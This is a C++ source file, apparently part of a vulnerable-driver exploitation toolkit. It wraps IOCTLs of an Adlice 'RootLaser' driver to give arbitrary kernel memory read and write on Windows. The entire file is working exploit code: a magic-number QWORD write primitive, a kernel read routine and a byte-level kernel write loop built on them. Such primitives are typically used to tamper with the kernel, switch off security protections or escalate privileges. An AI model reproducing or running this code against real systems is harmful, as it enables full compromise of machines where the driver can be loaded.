/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2026
*
*  TITLE:       ADLICE.CPP
*
*  VERSION:     1.50
*
*  DATE:        22 Sep 2026
*
*  Adlice driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/adlice.h"

/*
* RLaserWriteMemoryPrimitive
*
* Purpose:
*
* RootLaser write ULONG64 primitive.
*
*/
BOOL RLaserWriteMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG64 Value
)
{
    RLASER_WRITE_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.MagicNumber = RLASER_MAGIC;
    request.BaseAddress = (DWORD64)Address - RLASER_WRITE_BIAS;
    request.ValueToWrite = Value;

    return supCallDriver(
        DeviceHandle,
        IOCTL_RLASER_WRITE_MEMORY,
        &request,
        sizeof(RLASER_WRITE_REQUEST),
        NULL,
        0);
}

/*
* RLaserReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory using RootLaser.
*
*/
BOOL RLaserReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    BOOL bResult = FALSE;
    DWORD size = sizeof(RLASER_READ_REQUEST) + NumberOfBytes;
    PRLASER_READ_REQUEST pRequest;

    pRequest = (PRLASER_READ_REQUEST)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->TargetAddress = (DWORD64)Address;
        pRequest->DataLength = NumberOfBytes;
        pRequest->Unknown = 0;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_RLASER_READ_MEMORY,
            pRequest,
            size,
            pRequest,
            size);

        if (bResult)
            RtlCopyMemory(Buffer, pRequest, NumberOfBytes);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* RLaserWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory using RootLaser.
*
*/
BOOL RLaserWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    const BYTE* data = (const BYTE*)Buffer;

    for (ULONG bytesWritten = 0; bytesWritten < NumberOfBytes;) {
        ULONG64 value;
        ULONG_PTR currentAddress = Address + bytesWritten;
        ULONG offset = (ULONG)(currentAddress & (sizeof(value) - 1));
        ULONG_PTR wordAddress = currentAddress - offset;
        ULONG count = min(NumberOfBytes - bytesWritten, (ULONG)sizeof(value) - offset);

        //
        // RootLaser stores a full QWORD. Preserve bytes outside a partial write
        // and use aligned stores so a write never straddles a page boundary.
        //
        if (count != sizeof(value) &&
            !RLaserReadKernelVirtualMemory(DeviceHandle, wordAddress, &value, sizeof(value)))
        {
            return FALSE;
        }

        RtlCopyMemory((BYTE*)&value + offset, data + bytesWritten, count);
        if (!RLaserWriteMemoryPrimitive(DeviceHandle, wordAddress, value))
            return FALSE;

        bytesWritten += count;
    }
    return TRUE;
}
